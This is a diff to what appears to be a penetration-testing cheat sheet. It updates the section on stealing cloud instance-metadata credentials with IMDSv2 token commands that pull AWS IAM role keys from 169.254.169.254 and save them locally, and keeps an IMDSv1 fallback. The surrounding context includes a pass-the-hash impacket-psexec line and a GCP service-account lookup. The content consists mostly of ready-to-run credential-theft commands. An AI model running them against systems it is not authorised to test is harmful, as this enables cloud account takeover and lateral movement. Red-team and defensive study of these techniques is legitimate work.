@@ -351,10 +351,17 @@ impacket-psexec -hashes :<NTLM_hash> Administrator@<public-ip>
 ### IMDS credential theft (from inside a VM)
 
 ```bash
-# AWS — find role name, then get temporary credentials
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+# AWS — IMDSv2 is default for new launches since 2024-03; try it first
+TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
+  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
 # Save AccessKeyId + SecretAccessKey + Token to ~/.aws/credentials
+
+# Legacy IMDSv1 (only works if HttpTokens=optional on the instance)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
 
 # GCP
 gcloud compute instances describe $(hostname)    # find attached SA
